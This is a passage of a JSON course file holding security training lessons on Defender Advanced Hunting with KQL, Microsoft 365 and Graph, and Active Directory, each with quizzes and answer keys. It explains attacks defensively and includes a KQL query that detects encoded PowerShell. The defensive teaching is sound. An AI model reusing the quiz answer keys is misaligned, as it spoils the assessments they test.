    "https://learn.microsoft.com/en-us/defender-xdr/incidents-overview",
    "https://learn.microsoft.com/en-us/defender-endpoint/investigate-machines"
  ],
  "xp": 210,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-advanced-hunting-kql-defender",
  "slug": "advanced-hunting-with-kql-in-defender",
  "title": "Advanced Hunting with KQL in Microsoft Defender",
  "topic": "Microsoft Security",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "Alerts and incidents tell you about things Defender already decided are suspicious. But some of the most important SOC work is proactive: forming a hypothesis about how an attacker might operate and searching the raw telemetry to see whether it is happening — before any alert fires. In Microsoft Defender, that proactive search is called Advanced Hunting, and it is powered by a query language called KQL. This lesson introduces Advanced Hunting, teaches enough KQL to read and write real queries, tours the schema tables an analyst uses daily, and shows how a good hunting query becomes a permanent custom detection.",
  "sections": [
    {
      "heading": "What Advanced Hunting Is",
      "content": "**Advanced Hunting** is a query-based tool in the Microsoft Defender portal that lets you search across the **raw telemetry** collected from endpoints, email, identities, and cloud apps — typically the last **30 days** of events. Where an alert is Defender telling *you* something is wrong, Advanced Hunting is *you* asking Defender a precise question and getting back every matching event.\n\nThe distinction between **reactive** and **proactive** work is the heart of it:\n\n- **Reactive**: you respond to alerts and incidents that the platform generated. Essential, but by definition limited to what the built-in detections catch.\n- **Proactive (hunting)**: you start from a hypothesis — \"an attacker in our environment would probably run `whoami` right after landing,\" or \"they might use a renamed copy of a system tool\" — and you query the telemetry directly to test it. Hunting finds the things detections missed.\n\nAdvanced Hunting is where a hypothesis meets evidence. Because it queries the same underlying data that feeds alerts, you can look for faint patterns that never crossed an alert threshold: a single unusual process, a rare parent-child relationship, one user's odd sign-in pattern. It is also how you **scope an incident** — once you know an attacker's technique from one machine, you hunt the same pattern everywhere to find every affected host.\n\nThe tool is built on **KQL — Kusto Query Language** — a read-only language designed for fast searching and filtering of huge event tables. KQL is approachable: you can do useful work with a handful of operators, and it reads almost like a sentence. The next section teaches enough to be productive, and the one after tours the tables you will query. The payoff is real analyst power: the ability to answer, in seconds, questions the built-in detections were never written to ask."
    },
    {
      "heading": "Enough KQL to Be Dangerous",
      "content": "**KQL (Kusto Query Language)** reads top-to-bottom as a pipeline: you name a table, then pass its rows through a series of operators separated by the pipe character `|`, each one transforming the data. You do not need to master it all; a few operators cover most hunting.\n\n**The core operators:**\n\n- **`where`** — filter to the rows you care about. `where FileName == \"powershell.exe\"` keeps only PowerShell events.\n- **`project`** — choose which columns to show, like selecting fields. `project Timestamp, DeviceName, FileName`.\n- **`summarize`** — aggregate: count, group, find min/max. `summarize count() by DeviceName` gives a per-device tally.\n- **`sort` / `top`** — order results, or take the most extreme. `top 10 by Timestamp`.\n- **`join`** — combine two tables on a shared column, so you can, for example, link a process event to the sign-in that preceded it.\n\nA real query stacks these. Read this one as a sentence:\n\n```\nDeviceProcessEvents\n| where Timestamp > ago(24h)\n| where FileName == \"powershell.exe\"\n| where ProcessCommandLine contains \"-enc\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n```\n\nIt says: *from process events, in the last 24 hours, find PowerShell runs whose command line contains `-enc` (encoded commands, a common attacker tell), show me the time, device, account, and full command line, newest first.* The helper `ago(24h)` means \"24 hours ago,\" and time filters like this belong near the top of nearly every query because they make it fast.\n\nTwo habits make hunting effective. First, **filter early and narrowly** — put your most selective `where` clauses first so the query scans less data. Second, **project only what you need**, so results are readable. From here, the same handful of operators — `where`, `project`, `summarize`, `join` — will carry you through the overwhelming majority of real hunts. The skill that remains is knowing *which table* holds the data you want, which is the next section."
    },
    {
      "heading": "The Schema — Knowing Which Table to Query",
      "content": "Advanced Hunting organises telemetry into **schema tables**, each holding one kind of event. Knowing which table answers which question is the difference between hunting fluently and staring at a blank query box. The tables group naturally by sensor.\n\n**Endpoint (from Defender for Endpoint):**\n\n- **DeviceProcessEvents** — processes that ran, with command lines and parent-child links. The workhorse for execution and living-off-the-land hunts.\n- **DeviceNetworkEvents** — network connections a device made (useful for C2 and exfil).\n- **DeviceFileEvents** — file create/modify/delete.\n- **DeviceLogonEvents** — sign-ins to devices.\n- **DeviceRegistryEvents** — registry changes (persistence).\n\n**Email (from Defender for Office 365):**\n\n- **EmailEvents** — one row per message (sender, recipient, verdicts, delivery action).\n- **EmailAttachmentInfo** / **EmailUrlInfo** — attachments and URLs in messages.\n- **UrlClickEvents** — Safe Links click records (who clicked what, when).\n\n**Identity (from Defender for Identity / Entra):**\n\n- **IdentityLogonEvents** — authentication activity across AD and cloud.\n- **IdentityDirectoryEvents** / **IdentityQueryEvents** — directory changes and reconnaissance queries (for example, BloodHound-style enumeration).\n\n**Cloud apps and alerts:**\n\n- **CloudAppEvents** — activity in connected cloud apps.\n- **AlertInfo** / **AlertEvidence** — the alerts themselves and the entities tied to them, so you can pivot from a hunt to related alerts.\n\nThe practical skill is **mapping a question to a table**. \"Did anyone run a suspicious PowerShell command?\" → **DeviceProcessEvents**. \"Who clicked this phishing link?\" → **UrlClickEvents**. \"Was there unusual directory reconnaissance?\" → **IdentityQueryEvents**. \"Which devices connected to this malicious IP?\" → **DeviceNetworkEvents**.\n\nThe real power comes from **joining across tables**, because that mirrors how attacks actually cross domains. A single query can link an **EmailEvents** row (the phishing mail) to a **UrlClickEvents** row (the user clicked) to a **DeviceProcessEvents** row (something ran on their machine moments later) — reconstructing the whole initial-access chain from three sensors at once. That cross-domain pivot, expressed in a few lines of KQL, is what makes Advanced Hunting far more than a log search."
    },
    {
      "heading": "From Hunt to Custom Detection",
      "content": "A hunting query's life does not have to end when you close the tab. One of the most valuable things a SOC does is turn a good hunt into a **custom detection rule** — a saved query that Defender runs automatically on a schedule and that raises an alert (and can trigger response) whenever it finds a match. This is how a one-time discovery becomes permanent, automated coverage.\n\n**The workflow:**\n\n1. **Hunt** — write and refine a KQL query until it reliably surfaces the malicious pattern you care about, with few false positives.\n2. **Tune** — make sure the results are clean. A detection that fires constantly on benign activity is worse than none, because it trains analysts to ignore it. Add `where` clauses that exclude known-good behaviour.\n3. **Create the custom detection** — save the query as a rule, set how often it runs, choose the alert severity and title, and map the **entities** (device, user, file) the rule returns so the resulting alerts correlate into incidents properly.\n4. **Add response actions** — optionally, have the rule automatically isolate a device, run an antivirus scan, or mark a user as compromised when it fires.\n\nThe result is a feedback loop that steadily improves the SOC: analysts hunt for what the built-in detections miss, and the best hunts graduate into custom detections that catch the same thing automatically next time — freeing analysts to hunt for the *next* gap. This is **detection engineering** in miniature, and Advanced Hunting is the workbench where it happens.\n\nA few principles keep it healthy. **Ground hunts in real techniques** — MITRE ATT&CK is an excellent source of hypotheses, since each technique suggests a concrete query (\"how would I see T1059 PowerShell execution in DeviceProcessEvents?\"). **Prefer robust logic over brittle string matches** — hunting for a behaviour (a system tool spawning from an unusual parent) generalises better than matching one malware's exact filename. And **document what a detection is meant to catch**, so the next analyst understands why an alert fired. Done well, the hunt-to-detection loop is what turns a reactive alert-triage team into a proactive one that closes its own blind spots."
    }
  ],
  "keyTakeaways": [
    "Advanced Hunting is a query-based tool over ~30 days of raw Defender telemetry (endpoint, email, identity, cloud) for proactive, hypothesis-driven hunting — finding what built-in detections miss and scoping incidents across all hosts.",
    "KQL reads as a pipeline (table | operator | operator); the core operators where (filter), project (choose columns), summarize (aggregate), sort/top, and join cover most hunts — filter early and narrowly, project only what you need.",
    "Knowing which schema table answers which question is essential: DeviceProcessEvents (execution), DeviceNetworkEvents (C2/exfil), EmailEvents/UrlClickEvents (phishing/clicks), IdentityLogonEvents/IdentityQueryEvents (auth/recon), AlertInfo/AlertEvidence — and joining tables reconstructs cross-domain attack chains.",
    "A well-tuned hunt should graduate into a custom detection rule that runs automatically, raises correlated alerts, and can trigger response — closing the hunt-to-detection loop; ground hunts in MITRE ATT&CK and prefer behavioural logic over brittle string matches."
  ],
  "quiz": [
    {
      "question": "What is the essential difference between responding to Defender alerts and using Advanced Hunting, and why does hunting add value a purely alert-driven SOC lacks?",
      "options": [
        {
          "label": "Advanced Hunting only re-displays existing alerts in a table, so it adds convenience but cannot surface anything the built-in detections did not already flag.",
          "value": "a"
        },
        {
          "label": "Advanced Hunting lets you query raw telemetry to test your own hypotheses, finding faint patterns that never crossed an alert threshold — proactive rather than reactive work.",
          "value": "b"
        },
        {
          "label": "Advanced Hunting automatically resolves every alert without analyst input, so its value is eliminating triage rather than discovering any new malicious activity.",
          "value": "c"
        },
        {
          "label": "Advanced Hunting can only search data older than one year, so its sole purpose is long-term compliance archiving rather than active threat detection.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Advanced Hunting queries the raw telemetry directly so you can test your own hypotheses and surface faint patterns that never triggered an alert — proactive hunting that finds what built-in detections miss, unlike purely reactive alert triage. Option a is wrong because hunting searches raw events, not just existing alerts. Option c invents auto-resolution that does not exist. Option d misstates the retention (typically ~30 days) and purpose."
    },
    {
      "question": "You have refined a KQL query that reliably detects a specific malicious PowerShell pattern with very few false positives. What is the best next step to get lasting value from it, and what must you be careful about?",
      "options": [
        {
          "label": "Run the query manually once each morning forever, because Defender cannot save or schedule hunting queries and there is no way to automate a detection.",
          "value": "a"
        },
        {
          "label": "Save it as a scheduled custom detection rule so it raises correlated alerts automatically, being careful to tune out benign matches so it does not become noisy.",
          "value": "b"
        },
        {
          "label": "Broaden the query to match as many processes as possible before saving it, since a detection that fires on more events is always more useful to the SOC.",
          "value": "c"
        },
        {
          "label": "Delete the query after the current investigation, because hunting logic should never be reused and each incident requires writing detections entirely from scratch.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A well-tuned hunt should graduate into a scheduled custom detection rule that automatically raises correlated alerts (and can trigger response), with careful tuning so it does not fire on benign activity — a noisy detection trains analysts to ignore it. Option a is wrong because Defender does support saved, scheduled custom detections. Option c is dangerous advice, since over-broad detections create alert fatigue. Option d discards reusable value that the hunt-to-detection loop is designed to capture."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-overview",
    "https://learn.microsoft.com/en-us/kusto/query/",
    "https://learn.microsoft.com/en-us/defender-xdr/custom-detections-overview"
  ],
  "xp": 220,
  "estimatedMinutes": 42,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-microsoft-365-and-graph-for-security",
  "slug": "microsoft-365-and-graph-for-security",
  "title": "Microsoft 365 & Microsoft Graph for Security",
  "topic": "Microsoft Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "For most organisations, the crown jewels now live in Microsoft 365: the email, the documents, the chats, the identities. That makes M365 both the thing a SOC most needs to protect and one of the richest sources of investigation data available. Underneath the familiar apps sits a single audit trail and a single API — Microsoft Graph — that together let an analyst see and act on almost everything. This lesson explains what Microsoft 365 is, why it is such a target, how the unified audit log records activity across it, and how Microsoft Graph and its Security API tie the whole picture together.",
  "sections": [
    {
      "heading": "What Microsoft 365 Is — and Why It's a Target",
      "content": "**Microsoft 365 (M365)** is Microsoft's cloud productivity suite — the collection of services most organisations run their daily work on. The pieces a SOC cares about most are:\n\n- **Exchange Online** — email and calendars.\n- **SharePoint Online** — document libraries and intranet sites.\n- **OneDrive** — personal cloud file storage.\n- **Microsoft Teams** — chat, meetings, and collaboration.\n- **Microsoft Entra ID** — the identity service that everyone signs into (covered in its own lessons).\n\nBecause a modern company runs on these, M365 is where the valuable data *and* the valuable identities live. That concentration is exactly what makes it a prime target. An attacker who compromises a single M365 account potentially gains the user's email, their files in OneDrive and SharePoint, and their Teams conversations — and can use the trusted account to phish colleagues from the inside.\n\nThe attacks that dominate M365 incidents follow from this:\n\n- **Account takeover** via phishing, password spray, or token theft — the entry point for most of the rest.\n- **Business email compromise (BEC)** — using a real, trusted mailbox to defraud or phish others.\n- **Malicious inbox rules** — an attacker who owns a mailbox often creates a hidden rule to auto-forward or delete mail, maintaining stealthy access to the conversation.\n- **OAuth consent phishing** — tricking a user into granting a malicious app standing access to their mailbox and files (covered in its own lesson).\n- **Data exfiltration** — mass-downloading from SharePoint/OneDrive.\n\nThe defender's problem is that all this activity happens in the cloud, over legitimate protocols, often from a valid (if stolen) session. There are no packets on your wire to inspect. The evidence lives in M365's own records — which is why the **unified audit log** and **Microsoft Graph**, the subjects of the next sections, are the analyst's essential windows into what is really happening across the suite."
    },
    {
      "heading": "The Unified Audit Log — One Trail Across M365",
      "content": "The **unified audit log** is Microsoft 365's single, consolidated record of activity across all its workloads. Rather than hunting through separate logs for Exchange, SharePoint, OneDrive, Teams, and Entra, an analyst can search **one** trail that captures user and admin actions everywhere in the tenant. It is part of Microsoft **Purview** and is the backbone of most M365 investigations.\n\n**What it records.** Nearly every meaningful action becomes an audit event: a user signing in, reading or sharing a file, sending mail, creating an inbox rule, an admin changing a permission, a mailbox being accessed by someone other than its owner. Each event captures the familiar journalistic fields — **who** (the user or app), **what** (the operation), **when** (a UTC timestamp), **where from** (the client IP), and the **target** the action touched.\n\n**Operations an analyst hunts for** illustrate its power:\n\n- **New-InboxRule / Set-InboxRule** — creation of mail rules, a top signal of a compromised mailbox (attackers auto-forward or hide replies).\n- **Add-MailboxPermission / mailbox access by a non-owner** — someone reading a mailbox that is not theirs.\n- **File and sharing operations** in SharePoint/OneDrive — mass access or external sharing that can indicate exfiltration.\n- **Consent to application / Add service principal** — the fingerprints of OAuth consent phishing.\n- **UserLoggedIn and sign-in anomalies** — correlated with Entra sign-in logs for impossible travel and risky sign-ins.\n\n**Two practical cautions.** First, **audit logging must be enabled and retained** — the depth and length of retention depend on licensing, and if the data was not captured before an incident, it is not there afterward. Confirming audit coverage is part of readiness. Second, the unified audit log is broad but has its own schema and quirks; for high-volume endpoint or email *behavioural* detail, analysts also use Advanced Hunting. The two are complementary: the unified audit log is the wide, tenant-spanning record of *actions taken*, and it is usually the first place to reconstruct what a compromised M365 account did — who logged in, what they touched, and what persistence (like an inbox rule) they left behind."
    },
    {
      "heading": "Microsoft Graph — One API for Everything",
      "content": "**Microsoft Graph** is the single, unified API (application programming interface) that provides programmatic access to almost all of Microsoft 365. If the console is how a human clicks through M365, Graph is how *code* reads and changes it. Its single endpoint, `graph.microsoft.com`, reaches mail, files, calendars, users, groups, devices, and security data alike.\n\n**Why this matters to a SOC** cuts two ways, and an analyst must hold both.\n\n**Graph is a powerful tool for defenders.** Because one API reaches everything, you can automate investigation and response: pull a user's recent sign-ins, list the inbox rules on a mailbox, enumerate the apps a user has consented to, gather the files shared externally — all programmatically, and all consistently. Security tooling, SOAR playbooks, and scripts lean on Graph to gather evidence and take action at scale, far faster than clicking through portals.\n\n**Graph is also a target and a technique for attackers.** The same reach that helps defenders helps intruders. This is the deep connection to **OAuth consent phishing**: when an attacker tricks a user into consenting to a malicious app, the permissions that app requests — `Mail.Read`, `Files.Read.All`, `offline_access` — are **Graph permissions (scopes)**. The malicious app then calls Microsoft Graph to read the victim's mail and files, using tokens rather than a password. So understanding Graph is understanding *what* a consented app can actually do to a mailbox.\n\n**Permissions and identity.** Graph access is governed by **scopes** (the specific permissions granted, like `User.Read` or `Mail.ReadWrite`) and by whether an app acts as a signed-in user (delegated) or on its own (application permissions). For an analyst, reviewing which apps hold which Graph permissions in a tenant is a core hunting task — an unfamiliar app with broad mail and file scopes is exactly the artefact left behind by a consent-phishing attack. In short: Graph is the connective tissue of M365, the automation surface defenders use, and the access surface attackers abuse — which is why it deserves a place in every analyst's mental model."
    },
    {
      "heading": "The Graph Security API and Pulling It Together",
      "content": "Beyond reaching mail and files, Microsoft Graph exposes a dedicated **Graph Security API** that unifies *security* data and actions across Microsoft's products and partners. It is the programmatic counterpart to the Defender portal: a single, normalised way to read and manage security signals.\n\n**What it provides:**\n\n- **Unified alerts and incidents** — a common schema for security alerts (and incidents) drawn from Microsoft Defender products and integrated third parties, so tools can consume them consistently rather than learning each product's format.\n- **A path to automation and orchestration** — SIEM and SOAR platforms use the Security API to ingest alerts, enrich them, and drive response, making it a backbone for integrating M365 security into a broader SOC.\n- **Related security data** — such as secure-score information and threat intelligence indicators, reachable through the same API surface.\n\n**How the pieces fit together** is the real takeaway of this lesson. Picture a single M365 account-takeover investigation:\n\n1. An **Entra sign-in** risk (impossible travel) and an **MDO** phishing alert surface in the **Defender portal**, correlated into one **incident**.\n2. You reconstruct what the attacker did using the **unified audit log** — the sign-in, the files touched, and a malicious **inbox rule** they created for persistence.\n3. You check the mailbox and discover the attacker also used **OAuth consent** to grant a rogue app **Graph** permissions, giving it standing mailbox access independent of the password.\n4. Your automation, built on the **Graph Security API** and Graph itself, pulls the evidence together and can execute response — revoke the app's consent and tokens, remove the inbox rule, force a reset.\n\nThat single storyline touches every topic in this lesson — M365 as the target, the unified audit log as the record, Graph as the access surface, and the Graph Security API as the connective automation layer — and shows why they are taught together. For an analyst in a Microsoft environment, fluency here is what turns a scatter of portals and logs into one coherent, actionable picture of an attack."
    }
  ],
  "keyTakeaways": [
    "Microsoft 365 (Exchange, SharePoint, OneDrive, Teams, plus Entra ID) holds an organisation's data and identities, making it a prime target for account takeover, BEC, malicious inbox rules, OAuth consent phishing, and data exfiltration — all happening in the cloud with no packets to inspect.",
    "The unified audit log (part of Purview) is M365's single trail of who/what/when/where across all workloads; analysts hunt operations like New-InboxRule, non-owner mailbox access, external sharing, and app-consent events — but it must be enabled and retained before an incident.",
    "Microsoft Graph is the one API (graph.microsoft.com) reaching all of M365; it is both a defender's automation surface and an attacker's access surface — the Mail.Read/Files.Read.All/offline_access scopes in OAuth consent phishing are Graph permissions a malicious app uses to read mail and files via tokens.",
    "The Graph Security API unifies alerts/incidents and drives SIEM/SOAR automation; a single M365 takeover investigation ties it all together — Defender incident, unified-audit-log reconstruction, a rogue Graph-consented app, and Graph-based response (revoke consent/tokens, remove rule, reset)."
  ],
  "quiz": [
    {
      "question": "During an M365 account-takeover investigation, which data source is the best first place to reconstruct what the compromised user's account actually did across email, files, and settings — for example, discovering a malicious inbox rule left for persistence?",
      "options": [
        {
          "label": "The DeviceRegistryEvents table, because M365 mailbox rules and file shares are stored as Windows registry keys on the user's endpoint device.",
          "value": "a"
        },
        {
          "label": "The Microsoft 365 unified audit log, because it is the single trail of who did what across Exchange, SharePoint, OneDrive, and Teams, including inbox-rule creation.",
          "value": "b"
        },
        {
          "label": "The AWS CloudTrail log, because it records the management-plane API calls for all Microsoft 365 workloads in the organisation's tenant.",
          "value": "c"
        },
        {
          "label": "The Safe Attachments detonation report, because sandbox analysis of email attachments also lists every inbox rule and file-sharing action the account performed.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The unified audit log is M365's consolidated record of user and admin actions across all workloads, capturing operations like New-InboxRule, so it is the natural first place to reconstruct what a compromised account did. Option a is wrong because M365 cloud actions are not stored as endpoint registry keys. Option c is wrong because CloudTrail is AWS, not Microsoft 365. Option d misdescribes Safe Attachments, which detonates files and does not log inbox rules or sharing actions."
    },
    {
      "question": "In an OAuth consent phishing attack, a victim is tricked into approving a malicious app that requests Mail.Read, Files.Read.All, and offline_access. What is the connection to Microsoft Graph, and why does it make the attack dangerous?",
      "options": [
        {
          "label": "Those are Microsoft Graph permission scopes, so the app calls Graph with tokens to read the victim's mail and files without needing the password, surviving a reset.",
          "value": "a"
        },
        {
          "label": "Those permissions apply only to the attacker's own tenant, so Microsoft Graph prevents the app from ever reaching the victim's mailbox or stored files.",
          "value": "b"
        },
        {
          "label": "Microsoft Graph is unrelated to email, so the requested scopes can only affect the victim's calendar availability and never their actual mail or documents.",
          "value": "c"
        },
        {
          "label": "The scopes force the victim to re-enter their password on every Graph call, which is why the attack is easily detected and blocked by standard MFA prompts.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Mail.Read, Files.Read.All, and offline_access are Microsoft Graph permission scopes, so the consented app calls graph.microsoft.com with tokens to read the victim's mail and files without the password — and because it uses tokens, the access survives a password reset. Option b is wrong because the granted scopes apply to the victim's data. Option c falsely claims Graph is unrelated to email. Option d is wrong because token-based Graph access does not re-prompt for a password or MFA."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/purview/audit-solutions-overview",
    "https://learn.microsoft.com/en-us/graph/overview",
    "https://learn.microsoft.com/en-us/graph/security-concept-overview"
  ],
  "xp": 210,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-active-directory-and-domain-controllers",
  "slug": "active-directory-and-domain-controllers-explained",
  "title": "Active Directory & Domain Controllers: The Complete Foundation",
  "topic": "Active Directory",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Walk into almost any organisation running Windows and you will find Active Directory at its centre. It decides who every employee is, what they are allowed to touch, and which computer belongs to whom — for tens of thousands of people at once. And running that entire system is a special kind of server called the Domain Controller. For a SOC analyst this is not optional background knowledge: Active Directory is the single most valuable target in most enterprises, and nearly every serious intrusion ends with an attacker trying to own it. This lesson builds the whole picture from the ground up — what AD is, what a Domain Controller does, how the structure and objects fit together, the protocols that make it work, and why it is the crown jewel a SOC must protect.",
  "sections": [
    {
      "heading": "What Active Directory Is",
      "content": "**Active Directory (AD)** is Microsoft's **directory service**: a central database that stores information about every user, computer, group, and resource in an organisation, and that handles logging people in and deciding what they can access. If a company has 5,000 employees and 3,000 computers, Active Directory is the one system that knows all of them, holds everyone's account, and answers the question \"is this person who they claim to be, and are they allowed to do this?\"\n\nThe cleanest real-life analogy is a **giant, secure company directory combined with a master key system**. A phone directory lists everyone in the organisation with their details; Active Directory does that for digital identities, but it also *controls the locks* — it decides which keys (permissions) each person holds and checks their identity every time they try to open a door.\n\nActive Directory does three big jobs, and holding these apart makes everything else clearer:\n\n- **Authentication** — proving *who you are*. When you log into your work laptop with your username and password, Active Directory verifies you.\n- **Authorization** — deciding *what you can do*. Once it knows who you are, AD (together with the resources you reach) determines which files, servers, and applications you may use, based on your group memberships.\n- **Directory / management** — being the *single source of truth*. It stores all the accounts and settings centrally, so an admin can create one account, reset one password, or disable one user, and it takes effect everywhere at once.\n\nThat last point is why organisations love AD and why attackers covet it. **Centralisation is powerful in both directions.** For administrators, one place to manage everyone is enormously efficient. For an attacker, that same one place, if compromised, is the keys to the entire kingdom — control Active Directory and you potentially control every account and every computer that trusts it. The rest of this lesson unpacks how that central system is built and run, starting with the server that actually holds it: the Domain Controller."
    },
    {
      "heading": "The Domain Controller — the Server That Runs AD",
      "content": "A **Domain Controller (DC)** is a server that runs Active Directory and does the actual work of authenticating users and answering directory requests. Active Directory is the *service and database*; the Domain Controller is the *machine that hosts and runs it*. When people say \"the DC,\" they mean the beating heart of the Windows network.\n\n**What a Domain Controller does, minute to minute:**\n\n- **Authenticates logons.** Every time a user or computer signs into the domain, a Domain Controller verifies the credentials. It hosts the **Kerberos KDC** (Key Distribution Center), the service that issues the tickets used for authentication.\n- **Answers directory queries.** Applications and computers constantly ask the DC questions — \"what groups is this user in?\", \"where is this printer?\" — over the directory protocol LDAP.\n- **Enforces policy.** It distributes the security and configuration rules (Group Policy) that govern users and machines.\n- **Holds the database.** Every DC stores a copy of the AD database in a file called **`NTDS.dit`**.\n\nThat database file deserves special attention, because it is why the DC is the ultimate prize. **`NTDS.dit` contains every object in the domain — and critically, the password hashes of every account, including the administrators.** An attacker who can read this file, or trick a DC into handing over its contents, effectively obtains the credentials to the entire organisation. This is exactly what attacks like **DCSync** and **NTDS dumping** aim for, and it is why \"compromise a Domain Controller\" is functionally the same as \"compromise the whole domain.\"\n\nOrganisations run **more than one Domain Controller** for reliability — if one fails, others keep authenticating users — and the DCs keep each other's copies of the database in sync through **replication** (covered later). A DC also shares a special folder called **SYSVOL** over the network, which holds Group Policy files that every domain computer reads.\n\nThe security takeaway is stark and worth memorising: **the Domain Controller is Tier 0** — the most privileged, most protected asset class in the environment. Anything that can run code on a DC, or that holds Domain Admin rights, can rewrite the rules for everyone. Protecting DCs, and watching everything that touches them, is central SOC work."
    },
    {
      "heading": "The Structure — Domains, Trees, Forests, and OUs",
      "content": "Active Directory is organised into a deliberate hierarchy, and learning the four building blocks lets you read how any Windows environment is laid out.\n\n**Domain.** A **domain** is the core administrative and security grouping — a collection of users, computers, and resources that share one Active Directory database and one set of policies, identified by a name like `corp.example.com`. Most small and mid-size organisations are a single domain. Think of it as one self-contained community with its own membership list and rules.\n\n**Tree.** A **tree** is one or more domains that share a contiguous naming space — for example `example.com` with a child domain `sales.example.com` beneath it. Trees model organisations that want related but separately managed sub-domains.\n\n**Forest.** A **forest** is the outermost container: one or more trees that share a common schema (the definition of what object types exist), configuration, and a global catalog. Crucially, **the forest — not the domain — is the real security boundary of Active Directory.** Everything inside a forest implicitly trusts everything else in it at a deep level, so from a defender's viewpoint the forest is the unit you must consider compromised together. Large enterprises may run multiple domains in one forest, or even multiple forests connected by trusts.\n\n**Organisational Unit (OU).** Inside a domain, **OUs** are containers used to organise objects and apply management to them. An OU might hold all the accounts in the Finance department, or all the laptops in the London office. OUs matter for two practical reasons: **Group Policy** is applied to OUs (so you can push settings to just the machines in one OU), and **administrative control can be delegated** at the OU level (letting a regional admin manage only their own OU).\n\n| Level | What it is | Analogy |\n|-------|-----------|---------|\n| Forest | The whole environment; the security boundary | The entire corporation |\n| Tree | Domains sharing a namespace | A division and its sub-divisions |\n| Domain | One database + policy set | A single company site |\n| OU | A container inside a domain | A department or office folder |\n\nFor a SOC analyst, this structure is not trivia. It tells you the **blast radius**: because the forest is the trust boundary, a Domain Admin in one domain can often be leveraged toward Enterprise Admin across the whole forest, and an attacker who owns any domain's DC has a path to the rest. Knowing whether you face one domain or a multi-domain forest shapes how far you assume an intrusion can reach."
    },
    {
      "heading": "The Objects Inside — Users, Groups, Computers, and SIDs",
      "content": "Active Directory is a database, and the records it holds are called **objects**. Four kinds matter most to an analyst.\n\n**Users.** A **user object** is a person's account: their username, password (stored as a hash), group memberships, and attributes. There are also **service accounts** — user objects used by applications and services rather than people. Service accounts are a favourite attacker target because they often have strong privileges and passwords that rarely change (the weakness behind **Kerberoasting**).\n\n**Computers.** Every machine joined to the domain has a **computer object** and its own account, which is how the computer itself authenticates to the domain.\n\n**Groups.** A **group** bundles users (or computers) together so permissions can be granted to many accounts at once. Instead of giving 200 people access to a share individually, you put them in a group and grant the group. Groups come in two types — **security groups** (used to assign permissions) and **distribution groups** (used only for email lists) — and have different **scopes** (domain-local, global, universal) that control where they can be used.\n\nSome groups are extraordinarily powerful, and every analyst must know them by name:\n\n- **Domain Admins** — full control over the domain. Membership here is effectively the keys to that domain.\n- **Enterprise Admins** — control across the entire forest.\n- **Administrators** and **Schema Admins** — other highly privileged groups.\n\nBecause these groups are so powerful, **any change to their membership is a high-value security event.** An account being added to Domain Admins (Windows Event **4728/4732**) is one of the first things an attacker does after gaining a foothold, and one of the first things a SOC should alert on.\n\n**SIDs.** Every object has a unique identifier called a **SID (Security Identifier)** — a string like `S-1-5-21-…` that Windows actually uses internally to identify accounts (the human-readable name is just for us). The tail end of a SID, the **RID (Relative Identifier)**, marks well-known privileged accounts; for example, a SID ending in **`-512`** is the Domain Admins group, and **`-500`** is the built-in Administrator. Understanding SIDs matters because attacks like **Golden Tickets** forge them and **SID History** abuse hides privilege inside them — so when you read AD logs, you are often reading SIDs, and recognising the privileged ones tells you instantly how serious an event is."
    },
    {
      "heading": "How It All Works — LDAP, Kerberos, GPO, and Replication",
      "content": "Active Directory is made of moving parts that communicate over specific protocols. You do not need to implement them, but recognising each — and its port — lets you read what a Windows network is doing.\n\n**LDAP — asking the directory questions.** **LDAP (Lightweight Directory Access Protocol)** is how computers and applications *query and update* Active Directory: \"list the members of this group,\" \"find this user's email.\" It runs on **port 389** (or **636** for the encrypted version). LDAP is also how attackers *enumerate* AD — tools like **BloodHound** issue LDAP queries to map every user, group, and permission relationship, hunting for a path to Domain Admin.\n\n**Kerberos — proving identity.** **Kerberos** (port **88**) is the default authentication protocol. When you log in, a Domain Controller's KDC issues you a **ticket-granting ticket**, which you then exchange for tickets to specific services. (Its counterpart, the older **NTLM**, is the fallback.) Kerberos is why Domain Controllers are so central — they *are* the ticket authority — and it is the mechanism abused by **Kerberoasting**, **Pass-the-Ticket**, and **Golden Ticket** attacks.\n\n**DNS — finding the Domain Controllers.** Active Directory depends completely on **DNS**. Clients locate their Domain Controllers by looking up special DNS **SRV records**. If DNS is broken, AD stops working — which is why DCs usually run DNS themselves.\n\n**Group Policy (GPO) — pushing rules everywhere.** A **Group Policy Object (GPO)** is a bundle of configuration and security settings — password rules, software restrictions, drive mappings — that AD applies automatically to the users and computers in the OUs it is linked to. GPO files live in the DC's **SYSVOL** share and are pulled by every domain machine at logon and periodic refresh. GPO is a double-edged sword: it is how admins enforce security at scale, and it is a powerful attacker tool, because someone who can edit a widely-linked GPO can push malicious settings or code to thousands of machines at once.\n\n**Replication — keeping the DCs in sync.** Because an organisation runs multiple Domain Controllers, they must agree on the data. **Replication** is the automatic process by which every DC copies changes to the others, so a password changed on one DC is known to all of them within minutes. AD uses **multi-master** replication (a change can be made on any DC), which is great for resilience — but it is also what the **DCSync** attack impersonates, pretending to be a DC asking for replication data in order to steal password hashes without ever touching `NTDS.dit` directly.\n\nSeen together, these protocols are the anatomy of the Windows network: LDAP is how you ask, Kerberos is how you prove yourself, DNS is how you find the DCs, GPO is how rules are enforced, and replication is how the DCs stay consistent. Nearly every AD attack is an abuse of one of these normal mechanisms."
    },
    {
      "heading": "Why AD Is the Crown Jewel — the SOC Angle",
